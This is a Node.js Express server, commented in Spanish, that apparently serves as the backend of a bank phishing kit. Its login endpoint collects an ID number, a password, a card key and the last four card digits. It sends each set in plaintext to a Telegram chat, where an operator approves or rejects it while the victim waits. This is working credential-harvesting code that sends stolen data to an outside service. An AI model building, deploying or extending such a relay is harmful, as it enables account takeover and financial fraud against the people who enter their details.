import express from 'express';
import axios from 'axios';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

console.log("=== CONFIGURACIÓN DEL BACKEND ===");
console.log("BOT_TOKEN:", BOT_TOKEN ? "✅ Configurado" : "❌ FALTA");
console.log("CHAT_ID:", CHAT_ID ? "✅ Configurado" : "❌ FALTA");
console.log("=================================");

const requestsDB = new Map();

async function sendToTelegram(requestId, data) {
    const isTarjeta = data.tipo === 'tarjeta';
    
    let text = `<b>⚠️ NUEVA SOLICITUD DE VALIDACIÓN</b>\n\n`;
    text += `<b>Identificación:</b> ${data.identificacion}\n`;
    
    if (isTarjeta) {
        text += `<b>Clave Tarjeta:</b> ${data.clave}\n`;
        text += `<b>Últimos 4 dígitos:</b> ${data.ultimos4}\n`;
    } else {
        text += `<b>Clave Segura:</b> ${data.clave}\n`;
    }
    
    text += `\n<i>El usuario está esperando respuesta...</i>`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: "✅ Aprobar", callback_data: `approve_${requestId}` },
                { text: "❌ Rechazar", callback_data: `reject_${requestId}` }
            ]
        ]
    };

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML',
            reply_markup: keyboard
        });
        
        requestsDB.get(requestId).messageId = response.data.result.message_id;
        requestsDB.get(requestId).originalText = text;
        console.log(`✅ Mensaje enviado a Telegram para requestId: ${requestId}`);
        
    } catch (error) {
        console.error("❌ Error enviando a Telegram:", error.response?.data || error.message);
    }
}

app.post('/api/login', async (req, res) => {
    console.log("📥 Petición recibida en /api/login");
    console.log("Body:", JSON.stringify(req.body, null, 2));

    const { identificacion, clave, ultimos4, tipo } = req.body;

    if (!identificacion || !clave) {
        return res.status(400).json({ error: "Faltan datos requeridos." });
    }

    const requestId = Date.now().toString() + Math.random().toString(36).substring(2, 7);
    
    requestsDB.set(requestId, {
        status: 'pending',
        data: { identificacion, clave, ultimos4, tipo },
        messageId: null,
        originalText: null
    });

    sendToTelegram(requestId, { identificacion, clave, ultimos4, tipo });

    res.json({ requestId });
});

app.get('/api/status/:requestId', (req, res) => {
    const { requestId } = req.params;
    const request = requestsDB.get(requestId);

    if (!request) {
        return res.status(404).json({ status: 'error', message: 'Solicitud no encontrada' });
    }

    res.json({ status: request.status });
});

app.post('/api/webhook/telegram', async (req, res) => {
    const { callback_query } = req.body;

    if (!callback_query) {
        return res.sendStatus(200);
    }

    const data = callback_query.data;
    const messageId = callback_query.message.message_id;
    const chatId = callback_query.message.chat.id;
    
    // --- CAPTURAMOS QUIÉN HIZO CLIC ---
    const adminUser = callback_query.from;
    // Construimos el nombre: Nombre + Apellido (si tiene) + @username (si tiene)
    let adminName = `${adminUser.first_name || ''} ${adminUser.last_name || ''}`.trim();
    if (adminUser.username) {
        adminName += ` (@${adminUser.username})`;
    }
    if (!adminName) {
        adminName = 'Administrador desconocido';
    }

    const [action, requestId] = data.split('_');

    if (requestsDB.has(requestId)) {
        const request = requestsDB.get(requestId);
        request.status = action === 'approve' ? 'approved' : 'rejected';

        let newText = request.originalText;
        newText = newText.replace('\n<i>El usuario está esperando respuesta...</i>', '');
        
        // --- AGREGAMOS EL NOMBRE DEL ADMIN AL MENSAJE FINAL ---
        if (action === 'approve') {
            newText += `\n\n✅ <b>APROBADO POR:</b> ${adminName}`;
        } else {
            newText += `\n\n❌ <b>RECHAZADO POR:</b> ${adminName}`;
        }

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                chat_id: chatId,
                message_id: messageId,
                text: newText,
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            });
            
            console.log(`✅ Mensaje editado para requestId: ${requestId}. Acción: ${action} por ${adminName}`);
            
        } catch (error) {
            console.error("Error editando mensaje de Telegram:", error.response?.data || error.message);
        }

        res.sendStatus(200);
    } else {
        res.sendStatus(404);
    }
});

app.get('/', (req, res) => {
    res.send('Backend funcionando correctamente.');
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor corriendo en el puerto ${PORT}`);
});
